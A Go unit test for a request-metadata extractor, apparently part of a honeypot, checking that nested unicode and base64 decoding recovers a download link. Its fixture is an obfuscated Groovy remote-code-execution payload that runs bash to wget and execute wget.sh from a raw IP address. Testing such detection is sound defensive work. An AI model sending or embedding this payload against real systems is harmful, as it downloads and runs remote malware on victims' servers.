package extractors

import (
	"lophiid/pkg/database"
	"testing"
)

func TestUniExtractorNesting(t *testing.T) {

	co := NewExtractorCollection(true)

	req := database.Request{
		ID:   11,
		Uri:  "/",
		Body: []byte(`groovyProgram=\u005b\u0022\u0062\u0061\u0073\u0068\u0022\u002c\u0020\u0022\u002d\u0063\u0022\u002c\u0020\u0022\u007b\u007b\u0065\u0063\u0068\u006f\u002c\u0059\u0032\u0051\u0067\u004c\u0033\u0052\u0074\u0063\u0044\u0073\u0067\u0063\u006d\u0030\u0067\u004c\u0058\u004a\u006d\u0049\u0048\u0064\u006e\u005a\u0058\u0051\u0075\u0063\u0032\u0067\u0037\u0049\u0048\u0064\u006e\u005a\u0058\u0051\u0067\u0061\u0048\u0052\u0030\u0063\u0044\u006f\u0076\u004c\u007a\u0067\u0033\u004c\u006a\u0045\u0079\u004d\u0053\u0034\u0078\u004d\u0054\u0049\u0075\u004e\u0044\u0059\u0076\u0064\u0032\u0064\u006c\u0064\u0043\u0035\u007a\u0061\u0044\u0073\u0067\u0059\u0032\u0068\u0074\u0062\u0032\u0051\u0067\u004e\u007a\u0063\u0033\u0049\u0048\u0064\u006e\u005a\u0058\u0051\u0075\u0063\u0032\u0067\u0037\u0049\u0043\u0034\u0076\u0064\u0032\u0064\u006c\u0064\u0043\u0035\u007a\u0061\u0043\u0042\u0076\u005a\u006d\u004a\u0070\u0065\u006a\u0073\u0067\u0063\u006d\u0030\u0067\u004c\u0058\u004a\u006d\u0049\u0048\u0064\u006e\u005a\u0058\u0051\u0075\u0063\u0032\u0067\u003d\u007d\u007d\u007c\u007b\u007b\u0062\u0061\u0073\u0065\u0036\u0034\u002c\u002d\u0064\u007d\u007d\u007c\u007b\u007b\u0062\u0061\u0073\u0068\u002c\u002d\u0069\u007d\u007d\u0022\u005d\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029`),
	}
	co.ParseRequest(&req)

	allMd := co.AllMetadata(11)

	if len(allMd) != 3 {
		t.Errorf("expected 3 metadata, got %d", len(allMd))
	}

	metadataMap := make(map[string][]database.RequestMetadata)
	for _, m := range allMd {
		metadataMap[m.Type] = append(metadataMap[m.Type], m)
	}

	// The link in the request payload is nested 3 levels deep. First the unicode
	// extractor needs to decode the payload. Second the base64 extractor needs to
	// get and decode a base64 string from that result. Finally the link extractor
	// needs to get the link.

	if len(metadataMap["PAYLOAD_LINK"]) != 1 {
		t.Fatalf("expected 1 PAYLOAD_LINK, got %d", len(metadataMap["PAYLOAD_LINK"]))
	}

	expectedUrl := "http://87.121.112.46/wget.sh"
	if metadataMap["PAYLOAD_LINK"][0].Data != expectedUrl {
		t.Errorf("expected %s, got %s", expectedUrl, metadataMap["PAYLOAD_LINK"][0].Data)
	}
}
